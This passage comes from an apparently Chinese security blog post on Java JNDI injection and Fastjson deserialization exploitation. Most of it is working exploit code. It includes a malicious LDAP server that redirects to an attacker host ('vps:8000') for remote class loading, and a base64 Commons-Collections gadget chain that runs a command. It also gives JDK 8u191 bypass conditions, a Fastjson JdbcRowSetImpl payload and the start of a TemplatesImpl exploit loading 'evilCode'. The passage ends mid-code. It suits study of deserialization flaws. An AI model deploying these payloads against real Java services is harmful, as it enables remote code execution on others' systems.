</span><br><span class="line"> e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);  </span><br><span class="line"> e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());  </span><br><span class="line"> result.sendSearchEntry(e);  </span><br><span class="line"> result.setResult(new LDAPResult(0, ResultCode.SUCCESS));  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>JNDILdapClient.java</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line">public class JNDILdapClient &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception&#123;  </span><br><span class="line">        InitialContext initialContext = new InitialContext();  </span><br><span class="line"> RemoteObj remoteObj = (RemoteObj) initialContext.lookup(&quot;ldap://localhost:1099/remoteObj&quot;);  </span><br><span class="line"> System.out.println(remoteObj.sayHello(&quot;hello&quot;));  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="å¤ç°3"><a href="#å¤ç°3" class="headerlink" title="å¤ç°3"></a>å¤ç°3</h2><p>é«˜ç‰ˆæœ¬ç»•è¿‡</p>
<h3 id="8u191ä¹‹å‰"><a href="#8u191ä¹‹å‰" class="headerlink" title="8u191ä¹‹å‰"></a>8u191ä¹‹å‰</h3><p> <strong>jdk8u121 &lt; temp &lt; jdk8u191</strong></p>
<p>åŠ ä¸ªifï¼Œelseå°±è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// æ—§ç‰ˆæœ¬JDK  </span><br><span class="line"> /**  </span><br><span class="line"> * @param className A non-null fully qualified class name.  </span><br><span class="line"> * @param codebase A non-null, space-separated list of URL strings.  </span><br><span class="line"> */  </span><br><span class="line"> public Class&lt;?&gt; loadClass(String className, String codebase)  </span><br><span class="line"> throws ClassNotFoundException, MalformedURLException &#123;  </span><br><span class="line">  </span><br><span class="line"> ClassLoader parent = getContextClassLoader();  </span><br><span class="line"> ClassLoader cl =  </span><br><span class="line"> URLClassLoader.newInstance(getUrlArray(codebase), parent);  </span><br><span class="line">  </span><br><span class="line"> return loadClass(className, cl);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">// æ–°ç‰ˆæœ¬JDK  </span><br><span class="line"> /**  </span><br><span class="line"> * @param className A non-null fully qualified class name.  </span><br><span class="line"> * @param codebase A non-null, space-separated list of URL strings.  </span><br><span class="line"> */  </span><br><span class="line"> public Class&lt;?&gt; loadClass(String className, String codebase)  </span><br><span class="line"> throws ClassNotFoundException, MalformedURLException &#123;  </span><br><span class="line"> if (&quot;true&quot;.equalsIgnoreCase(trustURLCodebase)) &#123;  </span><br><span class="line"> ClassLoader parent = getContextClassLoader();  </span><br><span class="line"> ClassLoader cl =  </span><br><span class="line"> URLClassLoader.newInstance(getUrlArray(codebase), parent);  </span><br><span class="line">  </span><br><span class="line"> return loadClass(className, cl);  </span><br><span class="line"> &#125; else &#123;  </span><br><span class="line"> return null;  </span><br><span class="line"> &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ® <code>trustURLCodebaseçš„å€¼æ˜¯å¦ä¸ºtrue</code> çš„å€¼æ¥è¿›è¡Œåˆ¤æ–­ï¼Œå®ƒçš„å€¼é»˜è®¤ä¸º falseã€‚é€šä¿—çš„æ¥è¯´ï¼Œjdk8u191 ä¹‹åçš„ç‰ˆæœ¬é€šè¿‡æ·»åŠ  <code>trustURLCodebase çš„å€¼æ˜¯å¦ä¸º true</code> è¿™ä¸€æ‰‹æ®µï¼Œè®©æˆ‘ä»¬æ— æ³•åŠ è½½ codebaseï¼Œä¹Ÿå°±æ˜¯æ— æ³•è®©æˆ‘ä»¬è¿›è¡Œ URLClassLoader çš„æ”»å‡»äº†</p>
<h3 id="8u191ä¹‹å"><a href="#8u191ä¹‹å" class="headerlink" title="8u191ä¹‹å"></a>8u191ä¹‹å</h3><h4 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h4><ol>
<li>è¦æœåŠ¡ç«¯æœ¬åœ° ClassPath ä¸­å­˜åœ¨æ¶æ„ Factory ç±»å¯è¢«åˆ©ç”¨æ¥ä½œä¸º Reference Factory è¿›è¡Œæ”»å‡»åˆ©ç”¨</li>
<li>è¯¥æ¶æ„ Factory ç±»å¿…é¡»å®ç° <code>javax.naming.spi.ObjectFactory</code> æ¥å£ï¼Œå®ç°è¯¥æ¥å£çš„ getObjectInstance() æ–¹æ³•ã€‚</li>
<li></li>
</ol>
<h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p><code>org.apache.naming.factory.BeanFactory</code> ç±»ï¼Œ</p>
<p>å…·ä½“ä¾èµ– Tomcat ä¸­çš„ jar åŒ…ä¸ºï¼šcatalina.jarã€el-api.jarã€jasper-el.jarã€‚</p>
<h4 id="åˆ©ç”¨-LDAP-è¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°-Gadget"><a href="#åˆ©ç”¨-LDAP-è¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°-Gadget" class="headerlink" title="åˆ©ç”¨-LDAP-è¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°-Gadget"></a>åˆ©ç”¨-LDAP-è¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°-Gadget</h4><p>æ’å…¥æºç å’Œä¾èµ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;1.2.80&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;3.2.1&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">import com.unboundid.util.Base64;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line">import com.unboundid.ldap.sdk.Entry;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line">import com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line">import javax.net.ServerSocketFactory;</span><br><span class="line">import javax.net.SocketFactory;</span><br><span class="line">import javax.net.ssl.SSLSocketFactory;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.text.ParseException;</span><br><span class="line"></span><br><span class="line">public class JNDIGadgetServer &#123;</span><br><span class="line"></span><br><span class="line">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main (String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        String url = &quot;http://vps:8000/#ExportObject&quot;;</span><br><span class="line">        int port = 1234;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">                    &quot;listen&quot;,</span><br><span class="line">                    InetAddress.getByName(&quot;0.0.0.0&quot;),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;</span><br><span class="line"></span><br><span class="line">        private URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * */ public OperationInterceptor ( URL cb ) &#123;</span><br><span class="line">            this.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * &#123;@inheritDoc&#125;</span><br><span class="line">         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="line">         */ @Override</span><br><span class="line">        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = new Entry(base);</span><br><span class="line">            try &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            catch ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;</span><br><span class="line">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));</span><br><span class="line">            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);</span><br><span class="line">            e.addAttribute(&quot;javaClassName&quot;, &quot;Exploit&quot;);</span><br><span class="line">            String cbstring = this.codebase.toString();</span><br><span class="line">            int refPos = cbstring.indexOf(&#x27;#&#x27;);</span><br><span class="line">            if ( refPos &gt; 0 ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(0, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // Payload1: åˆ©ç”¨LDAP+Reference Factory  </span><br><span class="line">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);  </span><br><span class="line">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);  </span><br><span class="line">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());  </span><br><span class="line"></span><br><span class="line">            // Payload2: è¿”å›åºåˆ—åŒ–Gadget</span><br><span class="line">            try &#123;</span><br><span class="line">                e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;));</span><br><span class="line">            &#125; catch (ParseException exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line">import javax.naming.Context;  </span><br><span class="line">import javax.naming.InitialContext;  </span><br><span class="line">  </span><br><span class="line">public class JNDIGadgetClient &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        // lookupå‚æ•°æ³¨å…¥è§¦å‘  </span><br><span class="line"> Context context = new InitialContext();  </span><br><span class="line"> context.lookup(&quot;ldap://localhost:1234/ExportObject&quot;);  </span><br><span class="line">  </span><br><span class="line"> // Fastjsonååºåˆ—åŒ–JNDIæ³¨å…¥Gadgetè§¦å‘  </span><br><span class="line"> String payload =&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;;  </span><br><span class="line"> JSON.parse(payload);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><p>åƒ Jackson å’Œ fastjson åˆæœ‰ unicode å’Œ hex çš„ç¼–ç ç‰¹æ€§ï¼Œæ‰€ä»¥å°±å¯ä»¥å°è¯•ç¼–ç ç»•è¿‡ï¼Œå†™åœ¨log4jä¸Šè¾¹äº†</p>
<h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><ul>
<li><p><code>JSON.toJSONString</code> å°† Java å¯¹è±¡è½¬æ¢ä¸º json å¯¹è±¡ï¼Œåºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚</p>
</li>
<li><p><code>JSON.parseObject/JSON.parse</code> å°† json å¯¹è±¡é‡æ–°å˜å› Java å¯¹è±¡ï¼›ååºåˆ—åŒ–çš„è¿‡ç¨‹</p>
</li>
</ul>
<p>å½“ååºåˆ—åŒ–æŒ‡å®šçš„ç±»å‹æ˜¯Object.classï¼Œ</p>
<p>å³ä»£ç ä¸º<code>Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</code>æ—¶ï¼Œ</p>
<p>ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€æ‰€æœ‰å±æ€§çš„<code>setter</code>æ–¹æ³•ã€propertiesç§æœ‰å±æ€§çš„<code>getter</code>æ–¹æ³•éƒ½ä¼šè¢«è°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line">public class Fj2Application &#123;</span><br><span class="line">		public static void main(String[] args)&#123;</span><br><span class="line">			String jsonstring =&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.fj2.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;Mi1k7ea\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;;</span><br><span class="line">			Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</span><br><span class="line">			System.out.println(obj);</span><br><span class="line">			System.out.println(obj.getClass().getName());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2;</span><br><span class="line"></span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">public class Student &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    private String address;</span><br><span class="line">    private Properties properties;</span><br><span class="line"></span><br><span class="line">    public Student() &#123;</span><br><span class="line">        System.out.println(&quot;æ„é€ å‡½æ•°&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        System.out.println(&quot;getName&quot;);</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        System.out.println(&quot;setName&quot;);</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        System.out.println(&quot;getAge&quot;);</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getAddress() &#123;</span><br><span class="line">        System.out.println(&quot;getAddress&quot;);</span><br><span class="line">        return address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Properties getProperties() throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;getProperties&quot;);</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        return properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-24"><a href="#1-2-24" class="headerlink" title="-1.2.24"></a>-1.2.24</h2><p>TemplatesImpl ç±»ä¸­çš„ <code>getTransletInstance()</code> æ–¹æ³•</p>
<p><code>_name</code> ä¸å¯ä»¥ä¸º nullï¼Œ</p>
<p>éœ€è¦ <code>_class</code> ä¸º nullï¼Œ</p>
<p>è¿™æ ·è¿›å…¥åˆ° <code>defineTransletClasses</code> è¿™ä¸ªæ–¹æ³•é‡Œé¢ã€‚</p>
<p>æ‰€ä»¥ <code>_class</code> å¯ä»¥ä¸ç”¨å†™ï¼Œæˆ–è€…å†™ä¸º nullã€‚</p>
<p><code>_tfactory</code> ä¹Ÿä¸èƒ½ä¸º nullï¼Œ</p>
<p><code>_bytecodes</code> æ˜¯æ¶æ„å­—èŠ‚ç ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties()  </span><br><span class="line">---&gt; newTransformer() </span><br><span class="line">---&gt; TransformerImpl(getTransletInstance(), _outputProperties,  </span><br><span class="line"> _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;  </span><br><span class="line">import com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line">import org.apache.commons.codec.binary.Base64;  </span><br><span class="line">import org.apache.commons.io.IOUtils;  </span><br><span class="line">  </span><br><span class="line">import java.io.ByteArrayOutputStream;  </span><br><span class="line">import java.io.File;  </span><br><span class="line">import java.io.FileInputStream;  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">  </span><br><span class="line">// TemplatesImpl é“¾å­çš„ EXPpublic class TemplatesImplPoc &#123;  </span><br><span class="line">    public static String readClass(String cls)&#123;  </span><br><span class="line">        ByteArrayOutputStream bos = new ByteArrayOutputStream();  </span><br><span class="line"> try &#123;  </span><br><span class="line">            IOUtils.copy(new FileInputStream(new File(cls)), bos);  </span><br><span class="line"> &#125; catch (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">        return Base64.encodeBase64String(bos.toByteArray());  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String args[])&#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            ParserConfig config = new ParserConfig();  </span><br><span class="line"> final String fileSeparator = System.getProperty(&quot;file.separator&quot;);  </span><br><span class="line"> final String evilClassPath = &quot;E:\\JavaClass\\TemplatesBytes.class&quot;;  </span><br><span class="line"> String evilCode = readClass(evilClassPath);  </span><br><span class="line"> final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;  </span><br><span 